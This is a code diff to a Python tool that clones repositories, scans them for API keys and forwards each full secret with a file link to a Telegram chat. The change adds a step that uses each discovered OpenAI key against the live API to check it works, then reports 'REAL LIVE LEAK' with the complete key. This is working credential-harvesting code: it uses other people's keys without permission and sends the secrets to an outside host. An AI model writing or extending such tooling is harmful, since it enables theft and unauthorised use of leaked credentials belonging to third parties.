@@ -46,6 +46,20 @@ PATTERNS = {
     "Azure Storage/Client Secret": r"(?i)tenant_id|client_secret.*?['\"][a-zA-Z0-9\-_~.]{20,50}['\"]"
 }
 
+def validate_key(provider, key):
+    """Actively tests the key against its API to guarantee it is valid before alerting."""
+    if provider == "OpenAI API Key":
+        req = urllib.request.Request("https://api.openai.com/v1/models", headers={"Authorization": f"Bearer {key}"})
+        try:
+            with urllib.request.urlopen(req, timeout=5) as response:
+                return response.status == 200
+        except Exception:
+            return False
+            
+    # If it's a provider we haven't built an active validator for yet, we just return True
+    # to maintain the original regex-based alerting behavior.
+    return True
+
 def send_telegram_alert(provider, repo_name, match_preview, file_path=""):
     """Sends a formatted alert with full credential and direct file link to Telegram."""
     if not TELEGRAM_TOKEN or not TELEGRAM_CHAT_ID:
@@ -138,13 +152,24 @@ def clone_scan_and_destroy(repo_url, repo_name):
                     secrets = scan_file(filepath, clone_dir)
                     for secret in secrets:
                         rel_file = secret.get('file', '')
+                        provider = secret['provider']
+                        key = secret['match']
+                        
+                        # ACTIVE VALIDATION PIPELINE
+                        print(f"[*] Validating {provider}...")
+                        is_valid = validate_key(provider, key)
+                        
+                        if not is_valid:
+                            print(f"[-] Dropped {provider} (False Positive / Dead Key)")
+                            continue
+                            
                         print("\n" + "="*50)
-                        print(f"[!] ALERT! Found {secret['provider']} in {repo_name}!")
+                        print(f"[!] REAL LIVE LEAK! Found {provider} in {repo_name}!")
                         print(f"    File:        {rel_file}")
-                        print(f"    Full Secret: {secret['match']}")
+                        print(f"    Full Secret: {key}")
                         print("="*50 + "\n")
                         # Send to Telegram with direct file link
-                        send_telegram_alert(secret['provider'], repo_name, secret['match'], rel_file)
+                        send_telegram_alert(provider, repo_name, key, rel_file)
     finally:
         shutil.rmtree(clone_dir, ignore_errors=True)
         print(f"    [-] Obliterated repo: {repo_name}")
